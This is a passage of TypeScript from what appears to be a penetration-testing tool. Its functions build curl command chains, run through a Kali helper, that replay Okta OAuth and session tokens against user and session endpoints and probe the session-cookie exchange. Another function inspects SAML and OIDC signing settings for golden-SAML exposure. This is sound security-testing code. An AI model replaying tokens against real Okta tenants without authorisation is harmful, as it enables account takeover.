      `echo "Replaying: ${session_token ? "session token " : ""}${access_token ? "access token" : ""}${!session_token && !access_token ? "(none supplied)" : ""}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("jq"),
      `echo ""`,
    ];

    if (access_token) {
      commands.push(`echo "--- Replay OAuth access token against /api/v1/users/me (read-only) ---"`);
      commands.push(
        `curl -sS -H ${sq(`Authorization: Bearer ${access_token}`)} ${sq(`${orgUrl}/api/v1/users/me`)} 2>&1 | jq '{id, status, profile: {login: .profile.login}}' 2>&1 | head -c 6000 || echo "access-token replay FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
    }
    if (session_token) {
      commands.push(`echo "--- Replay session token against /api/v1/sessions/me (read-only) ---"`);
      commands.push(
        `curl -sS -H "Cookie: sid=${session_token}" ${sq(`${orgUrl}/api/v1/sessions/me`)} 2>&1 | jq '{id, status, login, expiresAt}' 2>&1 | head -c 6000 || echo "session replay (cookie) FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "--- One-time sessionToken -> cookie exchange probe (read-only) ---"`);
      commands.push(
        `curl -sS -D - -o /dev/null ${sq(`${orgUrl}/login/sessionCookieRedirect?token=${encodeURIComponent(session_token)}&redirectUrl=${encodeURIComponent(orgUrl)}`)} 2>&1 | head -c 4000 || echo "sessionToken exchange probe FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
    }
    if (!session_token && !access_token) {
      commands.push(`echo "No token supplied — provide session_token and/or access_token to replay."`);
    }
    commands.push(
      `echo "NOTE: a 200 with user/session context from the tester's IP/device proves the token is reusable and not bound (no IP/device pinning). Read-only — no session was revoked or mutated."`
    );
    commands.push(`echo "=== Okta Token Replay Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  test_okta_saml: async (args: {
    tenant_id: string;
    okta_org_url?: string;
    okta_api_token?: string;
    app_id?: string;
  }) => {
    const { tenant_id, okta_org_url, okta_api_token, app_id } = args;
    const orgUrl = (okta_org_url || tenant_id).replace(/\/+$/, "");
    const authHeader = okta_api_token ? `-H ${sq(`Authorization: SSWS ${okta_api_token}`)}` : "";

    const commands: string[] = [
      `echo "=== Okta SAML/OIDC Response Weakness Analysis (golden-SAML class) ==="`,
      `echo "Org: ${tenant_id}  URL: ${orgUrl}"`,
      `echo "App: ${app_id || "(org-level IdP metadata)"}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("jq"),
      preflight("xmllint", "--version"),
      `echo ""`,
    ];

    if (app_id && okta_api_token) {
      commands.push(`echo "--- App SAML metadata (/api/v1/apps/{id}/sso/saml/metadata) ---"`);
      commands.push(
        `curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/apps/${encodeURIComponent(app_id)}/sso/saml/metadata`)} 2>&1 | head -c 20000 || echo "SAML metadata request FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "--- Signing config inspection (assertion vs response signing, algorithm) ---"`);
      commands.push(
        `curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/apps/${encodeURIComponent(app_id)}`)} 2>&1 | jq '{name: .name, signOnMode: .signOnMode, saml: .settings.signOn}' 2>&1 | head -c 12000 || echo "app SAML settings request FAILED (see stderr above)"`
      );
    } else {
      commands.push(`echo "--- Org IdP/OIDC signing keys (jwks) — forged-assertion key-exposure check ---"`);
      commands.push(
        `curl -sS ${sq(`${orgUrl}/oauth2/default/v1/keys`)} 2>&1 | jq '.keys | [.[] | {kty, kid, alg, use}]' 2>&1 | head -c 8000 || echo "jwks request FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "--- ID-token signing config (.well-known) ---"`);
      commands.push(
        `curl -sS ${sq(`${orgUrl}/.well-known/openid-configuration`)} 2>&1 | jq '{id_token_signing_alg_values_supported, token_endpoint_auth_signing_alg_values_supported}' 2>&1 | head -c 6000 || echo "OIDC signing-config request FAILED (see stderr above)"`
      );
    }
    commands.push(`echo ""`);
    commands.push(
      `echo "ANALYSIS: golden-SAML class exposure = IdP signing key recoverable/weak (RSA-SHA1), assertion not individually signed (response-only signing enables XSW), or 'none'/HS256-tolerant token validation. A 'none'-alg or unsigned-assertion config means a forged assertion/token would be accepted. Analysis only — no forged assertion submitted."`
    );
    commands.push(`echo "=== Okta SAML Analysis Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },
};
